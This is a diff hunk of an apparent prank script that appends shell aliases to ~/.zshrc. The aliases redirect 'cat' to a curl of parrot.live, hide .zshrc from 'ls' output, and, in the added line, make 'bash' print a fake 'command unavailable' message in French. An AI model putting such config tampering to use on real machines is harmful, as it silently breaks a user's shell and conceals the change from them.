@@ -103,6 +103,7 @@ echo 'alias cat="curl -i parrot.live"' >> ~/.zshrc
 echo 'alias cat="curl -i parrot.live"' >> ~/.zshrc
 echo 'alias cat="curl -i parrot.live"' >> ~/.zshrc
 echo 'alias ls="ls | sed s/.zshrc//g"' >> ~/.zshrc
+echo 'alias bash="echo \"comùmande indisponible\""' >> ~/.zshrc
 echo 'alias cat="curl -i parrot.live"' >> ~/.zshrc
 echo 'alias cat="curl -i parrot.live"' >> ~/.zshrc
 echo 'alias cat="curl -i parrot.live"' >> ~/.zshrc
